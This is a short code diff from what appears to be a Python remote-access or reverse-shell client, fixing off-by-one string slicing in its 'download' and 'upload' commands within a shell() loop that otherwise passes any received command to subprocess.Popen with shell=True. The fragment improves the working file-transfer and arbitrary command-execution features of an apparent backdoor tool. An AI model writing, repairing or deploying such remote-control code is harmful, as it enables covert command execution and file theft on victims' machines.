@@ -68,9 +68,9 @@ def shell():
         elif command == 'clear':
             pass
         elif command[:9] == 'download ':
-            upload_file(command[10:])
+            upload_file(command[9:])
         elif command[:7] == 'upload ':
-            download_file(command[8:])
+            download_file(command[7:])
         else:
             # Execute the command using a process and pipe
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
